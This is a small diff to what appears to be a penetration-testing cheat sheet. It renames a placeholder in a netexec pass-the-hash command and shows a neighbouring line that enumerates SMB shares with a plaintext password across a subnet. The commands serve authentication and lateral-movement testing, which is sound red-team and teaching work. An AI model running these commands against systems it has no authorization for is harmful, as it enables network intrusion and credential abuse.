@@ -53,7 +53,7 @@ netexec smb 10.10.10.0/24 -u jsmith -p 'Winter2026!' --shares
 Pass-the-hash, local admin check:
 
 ```bash
-netexec smb TARGET -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
+netexec smb HOST -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
 ```
 
 Enumerate the domain (users, groups, password policy):
